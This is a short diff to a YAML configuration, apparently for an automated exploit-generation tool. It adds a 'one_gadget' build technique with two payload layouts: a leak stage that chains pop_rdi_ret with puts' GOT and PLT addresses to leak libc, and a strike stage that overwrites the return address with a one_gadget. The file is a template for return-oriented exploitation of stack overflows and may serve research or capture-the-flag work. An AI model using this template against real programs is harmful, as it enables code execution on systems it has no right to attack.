@@ -27,6 +27,22 @@ mcts:
   terminal: true
   success: 0.50
 
+build:
+  technique: one_gadget
+  # the one_gadget: the whole gamble is one qword. The leak stage
+  # rides the leak oracle (puts with a controlled rdi); the strike
+  # derives the one_gadget address from the leak at runtime (the
+  # exploit's one_gadget search) and lands it on the return slot.
+  variants:
+    - name: leak_stage
+      layout:
+        - [padding, measured_offset]
+        - [chain, "gadget:pop_rdi_ret", "got_addr:puts", "plt_addr:puts"]
+    - name: strike
+      layout:
+        - [padding, measured_offset]
+        - [qword, "leak:one_gadget"]
+
 priors: [5, 15]
 
 
